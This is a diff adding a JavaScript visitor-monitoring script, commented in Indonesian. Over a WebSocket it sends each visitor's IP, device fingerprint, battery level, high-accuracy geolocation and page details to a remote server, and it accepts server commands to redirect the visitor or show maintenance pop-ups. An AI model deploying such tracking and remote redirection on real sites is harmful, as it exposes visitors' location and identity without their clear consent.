+        '<path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>' +
+        '</svg>';
+    const SVG_CHECK =
+        '<svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#047857" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
+        '<circle cx="12" cy="12" r="10"/><path d="m8 12 3 3 5-6"/></svg>';
+
+    const state = {
+        base: readDataUser(),
+        cid: getClientId(),
+        ip: null,
+        device: null,
+        battery: null,
+        location: null,
+        logout: findLogoutUrl(),
+    };
+    const browser = getBrowser();
+    let socket = null;
+    let reconnectDelay = RECONNECT_MIN_MS;
+    let sendTimer = null;
+
+    // Socket dibuka lebih dulu agar pengguna langsung tercatat online; data yang lambat (IP, baterai,
+    // lokasi) dikirim ulang begitu tersedia, karena server menimpa payload pada setiap event newuser.
+    openSocket();
+    getDevice().then(v => { state.device = v; scheduleSend(); });
+    getIP().then(v => { state.ip = v; scheduleSend(); });
+    getBattery().then(v => { state.battery = v; scheduleSend(); });
+    getLocation().then(v => { state.location = v; scheduleSend(); });
+
+    function openSocket() {
+        const token = typeof window.uo_access_token === 'string' && window.uo_access_token ? window.uo_access_token : DEFAULT_TOKEN;
+        socket = new WebSocket(`${WS_URL}?token=${encodeURIComponent(token)}&cid=${encodeURIComponent(state.cid)}`);
+
+        socket.onopen = () => {
+            reconnectDelay = RECONNECT_MIN_MS;
+            sendUser();
+        };
+        socket.onerror = e => console.warn('WebSocket error:', e);
+        socket.onclose = () => {
+            // Jeda bertambah dua kali lipat sampai 30 detik, dengan sedikit acak agar klien tidak menyambung serentak.
+            const delay = reconnectDelay + Math.floor(Math.random() * 1000);
+            reconnectDelay = Math.min(reconnectDelay * 2, RECONNECT_MAX_MS);
+            setTimeout(openSocket, delay);
+        };
+        socket.onmessage = handleMessage;
+    }
+
+    function handleMessage(e) {
+        let msg;
+        try {
+            msg = JSON.parse(e.data);
+        } catch {
+            return;
+        }
+
+        if (msg.event === 'id' && typeof msg.data === 'string') {
+            // Server mengganti ID yang bentrok; ID yang diterima dipakai untuk koneksi berikutnya.
+            state.cid = msg.data;
+            try { sessionStorage.setItem('uo_cid', msg.data); } catch { /* sessionStorage tidak tersedia, ID berlaku untuk halaman ini saja */ }
+            return;
+        }
+        if (msg.event !== 'private') return;
+
+        const cmd = msg.data?.data;
+        if (!cmd || typeof cmd.act !== 'string') return;
+
+        if (cmd.act === 'logout') {
+            const url = safeHttpUrl(cmd.url);
+            if (url) window.location.href = url;
+        } else if (cmd.act === 'maintenance') {
+            showModal(cmd.title, cmd.message);
+        } else if (cmd.act === 'finish_maintenance') {
+            showModal(cmd.title, cmd.message, true);
+        }
+    }
+
+    function scheduleSend() {
+        clearTimeout(sendTimer);
+        sendTimer = setTimeout(sendUser, SEND_DEBOUNCE_MS);
+    }
+
+    function sendUser() {
+        if (!socket || socket.readyState !== WebSocket.OPEN) return;
+        socket.send(JSON.stringify({ event: 'newuser', data: buildUserData() }));
+    }
+
+    function buildUserData() {
+        const payload = { ...state.base.payload };
+        const link = payload.Link || window.location.href;
+        delete payload.Link;
+
+        if (state.ip) payload.IP = state.ip;
+        if (state.device) payload.Device = state.device;
+        if (state.battery) payload.Baterai = state.battery;
+        payload.Browser = browser;
+        if (state.location) {
+            payload.Lokasi = `<a href="https://www.google.com/maps?q=${state.location.coords}" target="_blank" rel="noopener noreferrer">` +
+                `${state.location.coords} (±${state.location.accuracy} m)</a>`;
+        }
+        payload.Link = link;
+        if (state.logout) payload.logout = state.logout;
+
+        return replaceBrowserPlaceholder({ serialkey: state.base.serialkey, payload });
+    }
+
+    function readDataUser() {
+        const source = typeof window.data_user === 'object' && window.data_user !== null ? window.data_user : null;
+        const copy = source ? JSON.parse(JSON.stringify(source)) : {};
+        return {
+            serialkey: typeof copy.serialkey === 'string' && copy.serialkey ? copy.serialkey : window.location.hostname,
+            payload: typeof copy.payload === 'object' && copy.payload !== null && !Array.isArray(copy.payload) ? copy.payload : {},
+        };
+    }
+
+    // Aplikasi klien boleh menaruh teks "[browser]" di data_user; semua kemunculannya diganti nama browser.
+    function replaceBrowserPlaceholder(value) {
+        if (typeof value === 'string') return value.split('[browser]').join(browser);
+        if (Array.isArray(value)) return value.map(replaceBrowserPlaceholder);
+        if (value && typeof value === 'object') {
+            const out = {};
+            for (const [k, v] of Object.entries(value)) out[k] = replaceBrowserPlaceholder(v);
+            return out;
+        }
+        return value;
+    }
+
+    function getClientId() {
+        try {
+            const saved = sessionStorage.getItem('uo_cid');
+            if (saved) return saved;
+            const id = randomHex(16);
+            sessionStorage.setItem('uo_cid', id);
+            return id;
+        } catch {
+            return randomHex(16);
+        }
+    }
+
+    function safeHttpUrl(value, base = window.location.href) {
+        if (typeof value !== 'string' || !value) return null;
+        try {
+            const url = new URL(value, base);
+            return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null;
+        } catch {
+            return null;
+        }
+    }
+
+    function findLogoutUrl() {
+        for (const a of document.querySelectorAll('a')) {
+            for (const attr of a.attributes) {
+                if (!/^(data-)?href$/i.test(attr.name)) continue;
+                const url = safeHttpUrl(attr.value);
+                if (!url) continue;
+                const { pathname, search } = new URL(url);
+                if (/log-?out|sign-?out|keluar/i.test(pathname + search)) return url;
+            }
+        }
+        return null;
+    }
+
+    function getLocation() {
+        return new Promise(resolve => {
+            if (!('geolocation' in navigator)) return resolve(null);
+            navigator.geolocation.getCurrentPosition(
+                p => resolve({
+                    coords: p.coords.latitude.toFixed(6) + ',' + p.coords.longitude.toFixed(6),
+                    accuracy: Math.round(p.coords.accuracy),
+                }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 5 * 60 * 1000 }
+            );
+        });
+    }
+
+    async function getIP() {
+        try {
+            const cached = sessionStorage.getItem('user_ip');
+            if (cached) return cached;
+        } catch { /* sessionStorage tidak tersedia, IP diambil ulang */ }
+        try {
+            const ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
+            try { sessionStorage.setItem('user_ip', ip); } catch { /* cache opsional */ }
+            return ip;
+        } catch {
+            return null;
+        }
+    }
+
+    function getBrowser() {
+        const ua = navigator.userAgent;
+        const pick = (name, re) => (name + ' ' + (ua.match(re)?.[1] || '')).trim();
+        if (ua.includes('Edg/')) return pick('Edge', /Edg\/([\d.]+)/);
+        if (ua.includes('OPR/')) return pick('Opera', /OPR\/([\d.]+)/);
+        if (ua.includes('SamsungBrowser/')) return pick('Samsung Internet', /SamsungBrowser\/([\d.]+)/);
+        if (ua.includes('Firefox/')) return pick('Firefox', /Firefox\/([\d.]+)/);
+        if (ua.includes('FxiOS/')) return pick('Firefox', /FxiOS\/([\d.]+)/);
+        if (ua.includes('CriOS/')) return pick('Chrome', /CriOS\/([\d.]+)/);
+        if (ua.includes('Chrome/')) return pick('Chrome', /Chrome\/([\d.]+)/);
+        if (ua.includes('Safari/')) return pick('Safari', /Version\/([\d.]+)/);
+        return 'Tidak diketahui';
+    }
+
+    async function getDevice() {
+        const ua = navigator.userAgent;
+        const uaData = navigator.userAgentData;
+        // Browser berbasis Chromium menyamarkan versi OS dan model di UA; nilai aslinya ada di high entropy hints.
+        let hints = {};
+        if (uaData?.getHighEntropyValues) {
+            try {
+                hints = await uaData.getHighEntropyValues(['platformVersion', 'model', 'bitness']);
+            } catch { /* hints tidak diizinkan, pakai UA */ }
+        }
+
+        const mem = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '';
+        const isIPadDesktopUA = /Macintosh/.test(ua) && navigator.maxTouchPoints > 1;
+        const isMobile = uaData?.mobile ?? /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        let emoji = '💻', device = 'Desktop', os = '', arch = '';
+
+        if (isIPadDesktopUA || /iPad/.test(ua)) {
+            emoji = '📟'; device = 'iPad';
+            const v = ua.match(/OS ([\d_]+)/)?.[1];
+            os = v ? 'iPadOS ' + v.replace(/_/g, '.') : 'iPadOS';
+        } else if (/iPhone/.test(ua)) {
+            emoji = '📱'; device = 'iPhone';
+            const v = ua.match(/iPhone OS ([\d_]+)/)?.[1];
+            os = v ? 'iOS ' + v.replace(/_/g, '.') : 'iOS';
+        } else if (/Android/i.test(ua)) {
+            emoji = '📱';
+            os = 'Android ' + (ua.match(/Android\s([\d.]+)/i)?.[1] || '');
+            const uaModel = ua.match(/Android\s[\d.]+;\s*([^);]+)/i)?.[1]?.trim();
+            device = hints.model || (uaModel && uaModel !== 'K' ? uaModel : '') || (isMobile ? 'Android' : 'Tablet Android');
+        } else if (/Windows NT/.test(ua)) {
+            const major = parseInt((hints.platformVersion || '').split('.')[0], 10);
+            os = major >= 13 ? 'Windows 11' : ua.includes('Windows NT 10.0') ? 'Windows 10'
+                : ua.includes('Windows NT 6.3') ? 'Windows 8.1' : ua.includes('Windows NT 6.1') ? 'Windows 7' : 'Windows';
+            arch = hints.bitness ? hints.bitness + '-bit' : (/WOW64|Win64|x64/.test(ua) ? '64-bit' : '32-bit');
+        } else if (/Macintosh|Mac OS X/.test(ua)) {
+            os = 'macOS';
+        } else if (/CrOS/.test(ua)) {
+            os = 'ChromeOS';
+        } else if (/Linux/.test(ua)) {
+            os = 'Linux';
+            if (/x86_64|aarch64/.test(ua)) arch = '64-bit';
+        }
+
+        const info = [os.trim(), arch, mem].filter(Boolean).join(' ');
+        return info ? `${emoji} ${device} (${info})` : `${emoji} ${device}`;
+    }
+
+    async function getBattery() {
+        if (!navigator.getBattery) return null;
+        try {
+            const b = await navigator.getBattery();
+            return (b.charging ? '⚡ Mengisi daya' : '🔋') + ' ' + Math.round(b.level * 100) + '%';
+        } catch {
+            return null;
+        }
+    }
+
+    function randomHex(len) {
+        const bytes = new Uint8Array(len / 2);
+        crypto.getRandomValues(bytes);
+        return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    function modalConfig(isFinished) {
+        return isFinished
+            ? {
+                icon: SVG_CHECK,
+                defaultTitle: 'Pemeliharaan Selesai',
+                defaultMessage: 'Sistem sudah dapat digunakan kembali. Silakan muat ulang halaman.',
+                buttonColor: '#047857',
+                titleColor: '#065f46',
+                buttonText: 'Tutup',
+                progressBar: '',
+            }
+            : {
+                icon: SVG_GEAR,
+                defaultTitle: 'Pemeliharaan Sistem',
+                defaultMessage: 'Sistem sedang dalam perbaikan. Mohon tunggu beberapa saat.',
+                buttonColor: '#b45309',
+                titleColor: '#92400e',
+                buttonText: 'Tutup',
+                progressBar: '<div class="mt-progress"><div></div></div>',
+            };
+    }
+
+    // Judul dan pesan dari server hanya disisipkan lewat textContent, tidak pernah lewat innerHTML.
+    function buildModalHtml() {
+        return `
+<style>
+  #maintenance-modal { position: fixed; inset: 0; z-index: 2147483000; display: flex; align-items: center; justify-content: center; padding: 16px; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; }
+  #maintenance-modal .mt-overlay { position: absolute; inset: 0; background: rgba(17, 24, 39, 0.5); }
+  #maintenance-modal .mt-card { position: relative; width: 100%; max-width: 400px; background: #fff; border-radius: 12px; padding: 28px 24px 24px; text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.18); }
+  #maintenance-modal .maintenance-icon-container { display: flex; justify-content: center; margin-bottom: 16px; }
+  #maintenance-modal .maintenance-title { margin: 0 0 8px; font-size: 18px; font-weight: 600; line-height: 1.4; }
+  #maintenance-modal .maintenance-message { margin: 0 0 16px; font-size: 14px; line-height: 1.6; color: #4b5563; }
+  #maintenance-modal .maintenance-progress { display: flex; justify-content: center; }
+  #maintenance-modal .mt-progress { width: 100%; max-width: 280px; height: 4px; margin: 4px 0 16px; background: #e5e7eb; border-radius: 2px; overflow: hidden; }
+  #maintenance-modal .mt-progress > div { width: 40%; height: 100%; background: #b45309; border-radius: 2px; animation: mt-progress 1.6s ease-in-out infinite; }
+  #maintenance-close { min-width: 120px; min-height: 44px; padding: 10px 20px; border: 0; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; }
+  #maintenance-close:focus-visible { outline: 2px solid #111827; outline-offset: 2px; }
+  #maintenance-modal .mt-spin { animation: mt-spin 4s linear infinite; }
+  #maintenance-modal.mt-enter .mt-card { animation: mt-in 200ms ease-out; }
+  #maintenance-modal.mt-leave { animation: mt-out 200ms ease-in forwards; }
+  @keyframes mt-progress { from { transform: translateX(-100%); } to { transform: translateX(250%); } }
+  @keyframes mt-spin { to { transform: rotate(360deg); } }
+  @keyframes mt-in { from { opacity: 0; transform: translateY(8px); } }
+  @keyframes mt-out { to { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) {
+    #maintenance-modal *, #maintenance-modal { animation: none !important; }
+  }
+</style>
+<div class="mt-overlay"></div>
+<div class="mt-card" role="dialog" aria-modal="true" aria-labelledby="maintenance-title" aria-describedby="maintenance-message">
+  <div class="maintenance-icon-container"></div>
+  <h2 class="maintenance-title" id="maintenance-title"></h2>
+  <p class="maintenance-message" id="maintenance-message"></p>
+  <div class="maintenance-progress"></div>
+  <button type="button" id="maintenance-close"></button>
+</div>`;
+    }
+
+    function showModal(title, message, isFinished = false) {
+        const cfg = modalConfig(isFinished);
+        let modal = document.getElementById('maintenance-modal');
+        if (modal) clearTimeout(modal._closeTimer);
+
+        if (!modal) {
+            modal = document.createElement('div');
+            modal.id = 'maintenance-modal';
+            modal.innerHTML = buildModalHtml();
+            document.body.appendChild(modal);
+
+            const close = () => {
+                modal.classList.remove('mt-enter');
+                modal.classList.add('mt-leave');
+                modal._closeTimer = setTimeout(() => {
+                    modal.style.display = 'none';
+                    modal.classList.remove('mt-leave');
+                    modal.dataset.open = '0';
+                    document.body.style.overflow = modal.dataset.prevOverflow || '';
+                }, 200);
+            };
+            modal.querySelector('#maintenance-close').addEventListener('click', close);
+            modal.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
+        }
+
+        modal.querySelector('.maintenance-icon-container').innerHTML = cfg.icon;
+        const t = modal.querySelector('.maintenance-title');
+        t.textContent = typeof title === 'string' && title ? title : cfg.defaultTitle;
+        t.style.color = cfg.titleColor;
+        modal.querySelector('.maintenance-message').textContent = typeof message === 'string' && message ? message : cfg.defaultMessage;
+        modal.querySelector('.maintenance-progress').innerHTML = cfg.progressBar;
+        const btn = modal.querySelector('#maintenance-close');
+        btn.textContent = cfg.buttonText;
+        btn.style.background = cfg.buttonColor;
+
+        // Kunci scroll dipasang setiap kali modal tampil, termasuk tampilan kedua dan seterusnya.
+        // Nilai overflow asli hanya dicatat saat modal berpindah dari tertutup ke terbuka.
+        if (modal.dataset.open !== '1') {
+            modal.dataset.prevOverflow = document.body.style.overflow || '';
+            modal.dataset.open = '1';
+        }
+        document.body.style.overflow = 'hidden';
+        modal.style.display = 'flex';
+        modal.classList.remove('mt-leave');
+        modal.classList.add('mt-enter');
+        btn.focus();
+    }
+});
